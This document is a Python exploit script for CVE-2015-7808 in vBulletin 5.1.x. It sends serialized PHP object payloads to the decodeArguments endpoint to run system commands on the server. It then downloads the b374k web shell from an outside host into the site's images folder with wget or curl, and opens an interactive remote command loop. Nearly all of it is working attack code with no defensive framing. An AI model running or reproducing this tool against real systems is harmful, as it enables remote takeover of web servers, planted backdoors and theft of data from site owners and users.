# Requirements              : Python 3.x , Requests
# Tested on                 : Ubuntu 15.04
# CVE                       : CVE-2015-7808
#VB 5.1.x exploit

import  requests, re, sys
from    urllib.parse    import urlparse

def inject( u ):
    url = u + '/ajax/api/hook/decodeArguments'
    try:
        r = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:14:"echo test";}', timeout= 50 )
        if 'test' in r.text and len( r.text ) < 50:
            try:
                r   = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:49:"whoami;echo :::;id;echo :::;uname -a;echo :::;pwd";}', timeout= 50 )
                print( '     [+] URL : ' + url )
                print( '     [+] WHOAMI  :  ' + r.text.split( ':::' )[0].strip() )
                print( '     [+] ID      :  ' + r.text.split( ':::' )[1].strip() )
                print( '     [+] UNAME   :  ' + r.text.split( ':::' )[2].strip() )
                print( '     [+] PWD     :  ' + r.text.split( ':::' )[3].strip() )
                sys.stdout.flush()
                return r.text.split( ':::' )[3].strip();
            except:
                return ''
        else:
            return ''
    except:
        print('     [+] Some Problem while exploiting..')
        return ''

def verify(u):
    command = 'cat images/test.php'
    url = u + '/ajax/api/hook/decodeArguments'
    try:
        r   = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:' + str(len(command)) + ':"' + command + '";}', timeout= 50 )
        if 'inf' in r.text:
            return True
        else :
            return False
    except:
        print('     [+] Some Problem while verifying shell')

def shell_wget(u):
    try:
        command = 'wget https://b374k-shell.googlecode.com/files/b374k-2.8.php -O images/test.php'
        url = u + '/ajax/api/hook/decodeArguments'
        r = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:' + str(len(command)) + ':"' + command + '";}', timeout= 50 )
        if verify(u) == True :
            print('     [+] Success with wget method')
            print('     [+] Find your shell at ' + u + '/images/test.php');
        else:
            print('     [+] Fail with wget method')
    except:
        print('     [+] Some Problem with WGET method')

def shell_curl(u):
    try:
        command = 'curl -o images/test.php https://b374k-shell.googlecode.com/files/b374k-2.8.php'
        url = u + '/ajax/api/hook/decodeArguments'
        r = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:' + str(len(command)) + ':"' + command + '";}', timeout= 50 )
        print(r.text)
        if verify(u) :
            print('     [+] Success with curl method')
            print('     [+] Find your shell at ' + u + '/images/test.php');
        else:
            print('     [+] Fail with curl method')
    except:
        print('     [+] Some Problem with CURL method')


def bash(u, command):
    url = u + '/ajax/api/hook/decodeArguments'
    r = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:' + str(len(command)) + ':"' + command + '";}', timeout= 50 )
    print(r.text)

def main():
    site = ''
    while site != 'exit':
        site = input('URL please : ')
        if site == 'exit':
            break
        wd = inject(site)
        if wd != '' :
            shell_wget(site)
            shell_curl(site)
            print('     [+] exploiting \n')
            userinput = ''
            while userinput != 'exit':
                userinput = input('you@site :')
                if userinput == 'exit':
                    break
                bash(site, userinput)
        else:
            print('     [+] url not vulnerable..')

if __name__ == '__main__':
    main()

#End
